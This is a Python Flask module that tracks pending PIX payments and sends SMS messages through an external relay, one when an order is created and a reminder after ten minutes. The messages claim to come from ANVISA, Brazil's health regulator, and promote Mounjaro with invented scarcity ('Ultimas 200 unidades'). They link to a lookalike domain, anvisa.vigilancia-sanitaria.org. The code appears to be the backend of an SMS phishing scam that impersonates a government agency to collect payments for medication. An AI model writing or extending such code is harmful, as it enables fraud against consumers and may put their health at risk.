import os
import time
import threading
import logging
import requests
from datetime import datetime, timedelta
from flask import current_app
from app import db
from models import Purchase

# Configure logging
logging.basicConfig(level=logging.INFO, 
                   format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Dictionary to store pending payments that need reminders
# Format: {transaction_id: {'created_at': timestamp, 'sent_reminder': False, 'customer_data': {...}}}
pending_payments = {}

# API endpoint for sending SMS
MANUAL_NOTIFICATION_API = "https://neto-contatonxcase.replit.app/api/manual-notification"

def register_payment(transaction_id, customer_data):
    """
    Register a new payment for tracking and reminder purposes
    
    Args:
        transaction_id: The unique ID of the transaction
        customer_data: Dictionary with customer data (name, phone, etc.)
    """
    now = datetime.utcnow()
    pending_payments[transaction_id] = {
        'created_at': now,
        'sent_reminder': False,
        'customer_data': customer_data
    }
    logger.info(f"[PAYMENT_TRACKER] New payment registered: {transaction_id}")
    
    # Send initial SMS for new payment generation
    send_initial_payment_sms(transaction_id, customer_data)

def mark_payment_completed(transaction_id):
    """
    Mark a payment as completed, removing it from the pending payments tracker
    
    Args:
        transaction_id: The unique ID of the transaction to mark as completed
    """
    if transaction_id in pending_payments:
        del pending_payments[transaction_id]
        logger.info(f"[PAYMENT_TRACKER] Payment completed and removed from tracking: {transaction_id}")

def send_initial_payment_sms(transaction_id, customer_data):
    """
    Send SMS notification when a PIX payment is first generated
    
    Args:
        transaction_id: The unique ID of the transaction
        customer_data: Dictionary with customer data
    """
    # Extract customer data
    customer_name = customer_data.get('name', '')
    phone_number = customer_data.get('phone', '')
    
    if not phone_number:
        logger.error(f"[PAYMENT_TRACKER] Cannot send initial SMS - no phone number for {transaction_id}")
        return
    
    # Get first name only
    first_name = customer_name.split(' ')[0] if customer_name else ''
    
    try:
        # Message template for new PIX generation
        message = f"ANVISA INFORMA: Seu Pedido MOUNJARO (1 CAIXA COM 4 UNIDADES) foi gerado com sucesso. Finalize o pagamento do QRcode PIX e confirme a sua compra antes que expire"
        
        # Send SMS via the API
        response = requests.post(
            MANUAL_NOTIFICATION_API,
            json={
                'phone': phone_number,
                'message': message
            }
        )
        
        if response.status_code == 200:
            logger.info(f"[PAYMENT_TRACKER] Initial payment SMS sent successfully for {transaction_id}")
        else:
            logger.error(f"[PAYMENT_TRACKER] Failed to send initial SMS for {transaction_id}. Status: {response.status_code}")
            
    except Exception as e:
        logger.error(f"[PAYMENT_TRACKER] Error sending initial SMS for {transaction_id}: {str(e)}")

def send_reminder_sms(transaction_id, customer_data):
    """
    Send reminder SMS for pending payment after 10 minutes
    
    Args:
        transaction_id: The unique ID of the transaction
        customer_data: Dictionary with customer data
    """
    # Extract customer data
    customer_name = customer_data.get('name', '')
    phone_number = customer_data.get('phone', '')
    
    if not phone_number:
        logger.error(f"[PAYMENT_TRACKER] Cannot send reminder SMS - no phone number for {transaction_id}")
        return
    
    # Get first name only
    first_name = customer_name.split(' ')[0] if customer_name else ''
    
    try:
        # Message template for reminder with customer's first name and transaction ID
        message = f"ANVISA: {first_name}, seu PIX para o Mounjaro esta pronto! Ultimas 200 unidades, reserva expira em pouco tempo. Pague agora: https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}"
        
        # Send SMS via the API
        response = requests.post(
            MANUAL_NOTIFICATION_API,
            json={
                'phone': phone_number,
                'message': message
            }
        )
        
        if response.status_code == 200:
            logger.info(f"[PAYMENT_TRACKER] Reminder SMS sent successfully for {transaction_id}")
            # Mark reminder as sent
            if transaction_id in pending_payments:
                pending_payments[transaction_id]['sent_reminder'] = True
        else:
            logger.error(f"[PAYMENT_TRACKER] Failed to send reminder SMS for {transaction_id}. Status: {response.status_code}")
            
    except Exception as e:
        logger.error(f"[PAYMENT_TRACKER] Error sending reminder SMS for {transaction_id}: {str(e)}")

def check_pending_payments():
    """
    Check all pending payments and send reminders for those pending over 10 minutes
    """
    now = datetime.utcnow()
    reminder_threshold = timedelta(minutes=10)
    
    for transaction_id, data in list(pending_payments.items()):
        # Skip payments that already have reminders sent
        if data['sent_reminder']:
            continue
            
        # Check if payment is more than 10 minutes old
        time_elapsed = now - data['created_at']
        
        if time_elapsed >= reminder_threshold:
            logger.info(f"[PAYMENT_TRACKER] Payment {transaction_id} pending for {time_elapsed.total_seconds()/60:.1f} minutes, sending reminder")
            send_reminder_sms(transaction_id, data['customer_data'])

def payment_reminder_worker():
    """
    Background worker that periodically checks for pending payments
    and sends reminders as needed
    """
    logger.info("[PAYMENT_TRACKER] Starting payment reminder worker thread")
    
    while True:
        try:
            check_pending_payments()
        except Exception as e:
            logger.error(f"[PAYMENT_TRACKER] Error in payment reminder worker: {str(e)}")
        
        # Check every minute
        time.sleep(60)

def start_payment_reminder_worker():
    """
    Starts the background worker thread to monitor payments and send reminders
    """
    worker_thread = threading.Thread(target=payment_reminder_worker, daemon=True)
    worker_thread.start()
    logger.info("[PAYMENT_TRACKER] Payment reminder worker thread started")
    return worker_thread
